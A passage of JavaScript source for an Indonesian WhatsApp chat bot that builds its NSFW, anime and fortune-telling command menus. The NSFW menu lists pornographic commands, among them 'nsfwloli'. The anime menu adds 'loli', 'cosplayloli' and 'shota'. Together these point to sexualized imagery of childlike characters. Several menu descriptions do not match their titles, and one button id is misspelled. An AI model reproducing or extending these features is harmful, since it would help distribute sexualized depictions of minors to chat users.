            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'nsfwmenubutton': {
let teks =`『 *\`乂 ᴀ ɴ ɪ ᴍ ᴇ - ɴғsᴡ 乂\`* 』━◧
║◦ *${prefix}hentai*
║◦ *${prefix}listbkp*
║◦ *${prefix}gifhentai*
║◦ *${prefix}gifblowjob*
║◦ *${prefix}hentaivid*
║◦ *${prefix}hneko*
║◦ *${prefix}nwaifu*
║◦ *${prefix}animespank*
║◦ *${prefix}trap*
║◦ *${prefix}gasm*
║◦ *${prefix}ahegao*
║◦ *${prefix}ass*
║◦ *${prefix}bdsm*
║◦ *${prefix}blowjob*
║◦ *${prefix}cuckold*
║◦ *${prefix}cum*
║◦ *${prefix}milf*
║◦ *${prefix}eba*
║◦ *${prefix}ero*
║◦ *${prefix}femdom*
║◦ *${prefix}foot*
║◦ *${prefix}gangbang*
║◦ *${prefix}glasses*
║◦ *${prefix}jahy*
║◦ *${prefix}masturbation*
║◦ *${prefix}mangasearch*
║◦ *${prefix}neko-hentai*
║◦ *${prefix}neko-hentai2*
║◦ *${prefix}nsfwloli*
║◦ *${prefix}orgy*
║◦ *${prefix}panties*
║◦ *${prefix}pussy*
║◦ *${prefix}tentacles*
║◦ *${prefix}thighs*
║◦ *${prefix}yuri*
║◦ *${prefix}zettai*
║◦ *${prefix}xnxxsearch*
║◦ *${prefix}xnxxdl*
┗━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'animebutton': {
let teks =`╭⊣「 *\`乂 ᴍᴇɴᴜ ᴀɴɪᴍᴇ 乂\`* 」⊢▤
║◦ *${prefix}akira*
║◦ *${prefix}akiyama*
║◦ *${prefix}ana*
║◦ *${prefix}asuna*
║◦ *${prefix}ayuzawa*
║◦ *${prefix}boruto*
║◦ *${prefix}chiho*
║◦ *${prefix}chitoge*
║◦ *${prefix}cosplayloli*
║◦ *${prefix}cosplaysagiri*
║◦ *${prefix}deidara*
║◦ *${prefix}doraemon*
║◦ *${prefix}elaina*
║◦ *${prefix}emilia*
║◦ *${prefix}erza*
║◦ *${prefix}gremory*
║◦ *${prefix}hestia*
║◦ *${prefix}hinata*
║◦ *${prefix}husbu*
║◦ *${prefix}inori*
║◦ *${prefix}isuzu*
║◦ *${prefix}itachi*
║◦ *${prefix}itori*
║◦ *${prefix}kaga*
║◦ *${prefix}kagura*
║◦ *${prefix}kakasih*
║◦ *${prefix}kaori*
║◦ *${prefix}keneki*
║◦ *${prefix}kotori*
║◦ *${prefix}kurumi*
║◦ *${prefix}loli*
║◦ *${prefix}madara*
║◦ *${prefix}megumin*
║◦ *${prefix}mikasa*
║◦ *${prefix}mikey*
║◦ *${prefix}miku*
║◦ *${prefix}minato*
║◦ *${prefix}naruto*
║◦ *${prefix}neko*
║◦ *${prefix}neko2*
║◦ *${prefix}nekonime*
║◦ *${prefix}nezuko*
║◦ *${prefix}onepiece*
║◦ *${prefix}pokemon*
║◦ *${prefix}randomnime*
║◦ *${prefix}randomnime2*
║◦ *${prefix}rize*
║◦ *${prefix}sagiri*
║◦ *${prefix}sakura*
║◦ *${prefix}sasuke*
║◦ *${prefix}shina*
║◦ *${prefix}shinka*
║◦ *${prefix}shinomiya*
║◦ *${prefix}shizuka*
║◦ *${prefix}shota*
║◦ *${prefix}tejina*
║◦ *${prefix}toukachan*
║◦ *${prefix}tsunade*
║◦ *${prefix}waifu*
║◦ *${prefix}animewall*
║◦ *${prefix}yotsuba*
║◦ *${prefix}yuki*
║◦ *${prefix}yulibocil*
║◦ *${prefix}yumeko*
║◦ *${prefix}8ball*
║◦ *${prefix}tickle*
║◦ *${prefix}gecg*
║◦ *${prefix}feed*
║◦ *${prefix}animeawoo*
║◦ *${prefix}animemegumin*
║◦ *${prefix}animeshinobu*
║◦ *${prefix}animehandhold*
║◦ *${prefix}animehighfive*
║◦ *${prefix}animecringe*
║◦ *${prefix}animedance*
║◦ *${prefix}animehappy*
║◦ *${prefix}animeglomp*
║◦ *${prefix}animeblush*
║◦ *${prefix}animesmug*
║◦ *${prefix}animewave*
║◦ *${prefix}animesmile*
║◦ *${prefix}animepoke*
║◦ *${prefix}animewink*
║◦ *${prefix}animebonk*
║◦ *${prefix}animebully*
║◦ *${prefix}animeyeet*
║◦ *${prefix}animebite*
║◦ *${prefix}animelick*
║◦ *${prefix}animekill*
║◦ *${prefix}animecry*
║◦ *${prefix}animewlp*
║◦ *${prefix}animekiss*
║◦ *${prefix}animehug*
║◦ *${prefix}animeneko*
║◦ *${prefix}animepat*
║◦ *${prefix}animeslap*
║◦ *${prefix}animecuddle*
║◦ *${prefix}animewaifu*
║◦ *${prefix}animenom*
║◦ *${prefix}animefoxgirl*
║◦ *${prefix}animegecg*
║◦ *${prefix}animetickle*
║◦ *${prefix}animefeed*
║◦ *${prefix}animeavatar*
║◦ *${prefix}genshin*
║◦ *${prefix}anime*
║◦ *${prefix}amv*
╰━━━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'primbonmenubutton': {
let teks =`┏『 *\`乂 ᴘ ʀ ɪ ᴍ ʙ ᴏ ɴ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}artimimpi*
║◦ *${prefix}artinama*
║◦ *${prefix}ramaljodoh*
║◦ *${prefix}ramaljodohbali*
║◦ *${prefix}suamiistri*
║◦ *${prefix}ramalcinta*
║◦ *${prefix}cocoknama*
║◦ *${prefix}pasangan*
║◦ *${prefix}jadiannikah*
║◦ *${prefix}sifatusaha*
║◦ *${prefix}rezeki*
║◦ *${prefix}pekerjaan*
║◦ *${prefix}nasib*
║◦ *${prefix}penyakit*
║◦ *${prefix}tarot*
║◦ *${prefix}fengshui*
║◦ *${prefix}haribaik*
║◦ *${prefix}harisangar*
║◦ *${prefix}harisial*
║◦ *${prefix}nagahari*
